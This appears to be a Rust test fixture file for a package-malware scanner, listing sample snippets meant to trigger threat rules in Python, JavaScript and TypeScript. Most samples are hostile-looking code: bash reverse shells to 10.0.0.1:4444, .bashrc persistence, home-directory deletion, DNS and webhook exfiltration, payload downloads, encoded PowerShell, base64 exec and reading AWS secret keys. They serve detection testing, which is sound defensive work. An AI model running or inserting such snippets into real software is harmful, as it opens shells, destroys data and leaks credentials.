//! Positive fixtures for GuardDog threat detections.

use crate::common::Case;

pub(crate) const CASES: &[Case] = &[
    // GuardDog threat rules (Python).
    Case {
        rule_id: "chainsec.py.detection.guarddog.autostart",
        file: "case.py",
        source: "open(\"/home/user/.bashrc\", \"a\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.destructive-deletion",
        file: "case.py",
        source: "import shutil\nshutil.rmtree(\"/home/user\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.dns-exfiltration",
        file: "case.py",
        source: "import socket\nsocket.gethostbyname(secret + \".example.com\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.messenger-exfiltration",
        file: "case.py",
        source: "url = \"https://api.telegram.org/bot123456:AAH8fK2vQ9wN4rT7yU1iO5pL3sD6fG0hJ9k/sendMessage\"\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.suspicious-network-destination",
        file: "case.py",
        source: "callback = \"https://webhook.site/abc-def\"\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.reverse-shell",
        file: "case.py",
        source: "import os\nos.system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.reverse-shell",
        file: "case.py",
        source: "import subprocess\nsubprocess.run((\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\",))\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.cryptomining",
        file: "case.py",
        source: "miner = \"xmrig\"\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.download-and-execute",
        file: "case.py",
        source: "import os\nos.system(\"pip install evil-package\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.download-and-execute",
        file: "case.py",
        source: "import subprocess\nsubprocess.run((\"curl\", \"https://example.com/payload\"))\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.encoded-powershell",
        file: "case.py",
        source: "import os\nos.system(\"powershell -EncodedCommand SQBFAFgAIAAoACcAAG4AZQB3AC0A\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.encoded-powershell",
        file: "case.py",
        source: "import subprocess\nsubprocess.run((\"powershell -EncodedCommand SQBFAFgAIAAoACcAAG4AZQB3AC0A\",))\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.base64-decoded-execution",
        file: "case.py",
        source: "import base64\nexec(base64.b64decode(blob))\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.dynamic-import",
        file: "case.py",
        source: "exec(__import__(\"os\"))\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.reflective-api",
        file: "case.py",
        source: "getattr(mod, \"exec\")(\"code\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.pyarmor",
        file: "case.py",
        source: "__pyarmor__(__name__, __file__, b'payload')\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.screen-capture",
        file: "case.py",
        source: "import pyautogui\npyautogui.screenshot()\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.credential-environment",
        file: "case.py",
        source: "import os\nos.getenv(\"AWS_SECRET_ACCESS_KEY\")\n",
    },
    // GuardDog threat rules (JavaScript/TypeScript share queries).
    Case {
        rule_id: "chainsec.js.detection.guarddog.autostart",
        file: "case.js",
        source: "fs.appendFileSync(\"/home/user/.bashrc\", \"payload\");\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.autostart",
        file: "case.ts",
        source: "fs.appendFileSync(\"/home/user/.bashrc\", \"payload\");\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.destructive-deletion",
        file: "case.js",
        source: "rimraf(\"/home/user\");\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.destructive-deletion",
        file: "case.ts",
        source: "rimraf(\"/home/user\");\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.messenger-exfiltration",
        file: "case.js",
        source: "const url = \"https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz\";\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.messenger-exfiltration",
        file: "case.ts",
        source: "const url = \"https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz\";\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.suspicious-network-destination",
        file: "case.js",
        source: "const callback = \"https://ngrok.io/tunnel\";\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.suspicious-network-destination",
        file: "case.ts",
        source: "const callback = \"https://ngrok.io/tunnel\";\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.reverse-shell",
        file: "case.js",
        source: "exec(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\");\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.reverse-shell",
        file: "case.ts",
        source: "exec(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\");\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.cryptomining",
        file: "case.js",
        source: "const miner = \"xmrig\";\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.cryptomining",
        file: "case.ts",
        source: "const miner = \"xmrig\";\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.download-and-execute",
        file: "case.js",
        source: "exec(\"npm install evil-package\");\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.download-and-execute",
        file: "case.ts",
        source: "exec(\"npm install evil-package\");\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.encoded-powershell",
        file: "case.js",
        source: "exec(\"powershell -EncodedCommand SQBFAFgAIAAoACcAAG4AZQB3AC0A\");\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.encoded-powershell",
        file: "case.ts",
        source: "exec(\"powershell -EncodedCommand SQBFAFgAIAAoACcAAG4AZQB3AC0A\");\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.base64-decoded-execution",
        file: "case.js",
        source: "eval(atob(payload));\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.base64-decoded-execution",
        file: "case.ts",
        source: "eval(atob(payload));\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.reflective-api",
        file: "case.js",
        source: "Object.getOwnPropertyDescriptor(mod, \"run\").value();\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.reflective-api",
        file: "case.ts",
        source: "Object.getOwnPropertyDescriptor(mod, \"run\").value();\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.hidden-require",
        file: "case.js",
        source: "global[\"rq\"] = require;\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.hidden-require",
        file: "case.ts",
        source: "global[\"rq\"] = require;\n",
    },
];
